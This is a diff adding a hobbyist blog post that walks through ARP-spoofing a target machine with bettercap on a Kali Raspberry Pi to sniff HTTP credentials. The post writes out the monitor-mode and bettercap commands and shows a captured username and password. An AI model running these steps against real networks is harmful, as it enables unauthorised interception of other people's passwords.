@@ -9,16 +9,16 @@
         <meta name="twitter:card" content="summary_large_image"/>
         <meta name="twitter:site" content="@zkpz_"/>
         <meta name="twitter:creator" content="@zkpx_"/>
-        <meta name="twitter:title" content="POSTTITLE">
-        <meta name="twitter:description" content="POSTTITLE"/>
-        <meta property="og:url" content="POSTTITLE"/>
-        <meta property="og:title" content="POSTTITLE"/>
-        <meta name="og:description" content="POSTTITLE"/>
+        <meta name="twitter:title" content="RaspberryPi + Linux + BetterCap">
+        <meta name="twitter:description" content="RaspberryPi + Linux + BetterCap"/>
+        <meta property="og:url" content="RaspberryPi + Linux + BetterCap"/>
+        <meta property="og:title" content="RaspberryPi + Linux + BetterCap"/>
+        <meta name="og:description" content="RaspberryPi + Linux + BetterCap"/>
         <meta name="author" content="zackelmet"/>
         <meta property="og:image:type" content="image/png">
         <meta property="og:image:width" content="1200">
         <meta property="og:image:height" content="675">
-        <title>ZE | POSTTITLE </title>
+        <title>RaspberryPi + Linux + BetterCap</title>
         <!-- Global site tag (gtag.js) - Google Analytics 
         <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
         <script>
@@ -57,7 +57,7 @@
                                             </a>
                                             <article>
                                                 <header class="flex flex-col">
-                                                    <h1 class="mt-6 text-4xl font-bold tracking-tight text-zinc-100 sm:text-5xl">List 100</h1>
+                                                    <h1 class="mt-6 text-4xl font-bold tracking-tight text-zinc-100 sm:text-5xl">RaspberryPi + Linux + BetterCap</h1>
                                                     <time datetime="2022-09-05" class="order-first flex items-center text-base text-zinc-500">
                                                         <span class="h-4 w-0.5 rounded-full bg-zinc-500"></span>
                                                         <span class="ml-3">July, 2023</span>
@@ -68,9 +68,70 @@
                                                     <p>&nbsp;</p>
                                                     <p>&nbsp;</p>
                                                 <div class="mt-4 prose prose-invert prose-a:text-emerald-500 prose-gray" data-mdx-content="true">
-                                                    <p> 1 </p>
-                                                    <p> 2 </p>
-                                                    <p> 3 </p>
+                                                    <p></p>
+
+                                                    <p>Wifi security is important. From a security perspective it can often be a weak point. Here are some cool penetration testing tools to prod at your local wireless network security. Note: Always use hacking for good, including the following.</p>
+
+                                                    <p>Raspi’s are awesome. We are going to use one, in combination with an external wifi card, to grab passwords that our target machine is submitting into a webpage. We will be using an arp spoof attack to mitm our target machine and read their network traffic.</p>
+
+                                                    <p>The Raspi programming is installing a linux distro on an sd card. In this case a RaspberryPi may even be a bit of overkill, in terms of resources. It would be cool to get these tools on an even smaller form factor like some kind of arduino with an on-board packet injection supported wifi chip -- project for another day.</p>
+
+                                                    <p>Today we are using these:</p>
+
+                                                    <p>Step one is downloading Kali Linux and burning it to an sd card. Here is some documentation on how do that. Once installed, shove that card in your RasPi and boot it up. Get into the desktop, connect to wifi, and you are good to go.</p>
+
+                                                    <p>Once you bask in the glory of your new Kali Linux box you’ll want to connect your external wifi card and get it into monitor mode.</p>
+
+                                                    <p>Note: You will need an external wifi card that supports packet injection and monitor mode. This is my favorite one.</p>
+
+                                                    <p>Find your WiFi card name in iwconfig</p>
+
+                                                    <p>And set it to monitor mode with these commands:</p>
+
+                                                    <p>Ifconfig wlan1 down<br>
+                                                    Iwconfig wlan1 mode monitor<br>
+                                                    Ifconfig wlan1 up</p>
+
+                                                    <p>Turn those commands into a shell script for convenience:</p>
+
+                                                    <p>echo "Ifconfig wlan1 down<br>
+                                                    Iwconfig wlan1 mode monitor<br>
+                                                    Ifconfig wlan1 up" > monmode.sh</p>
+
+                                                    <p>There are a lot of tools to perform mitm attacks. We are going to be using bettercap to arp spoof our target machine.</p>
+
+                                                    <p>Launch bettercap in the command line:</p>
+
+                                                    <p>Bettercap</p>
+
+                                                    <p>Use the ‘help’ command to see the modules you are currently running:</p>
+
+                                                    <p>You will want to turn net.probe and net.recon on:</p>
+
+                                                    <p>net.probe on<br>
+                                                    net.recon on</p>
+
+                                                    <p>Run net.show to see the other devices connected to your network:</p>
+
+                                                    <p>Find your target machine and note its IP address.</p>
+
+                                                    <p>Next set up your arp.spoof with these commands:</p>
+
+                                                    <p>set arp.spoof.fullduplex true<br>
+                                                    set arp.spoof.targets [Target IP]</p>
+
+                                                    <p>Once that is done your bettercap modules should look like this:</p>
+
+                                                    <p>Now start the net.sniff module:</p>
+
+                                                    <p>net.sniff on</p>
+
+                                                    <p>If your target machine is generating traffic, bettercap will immediately start looking thru it and presenting you with the interesting stuff:</p>
+
+                                                    <p>It will even capture passwords over http traffic:</p>
+
+                                                    <p>Username: Admin<br>
+                                                    Password: zack123</p>
                                                 </div>
                                             </article>
                                         </div>
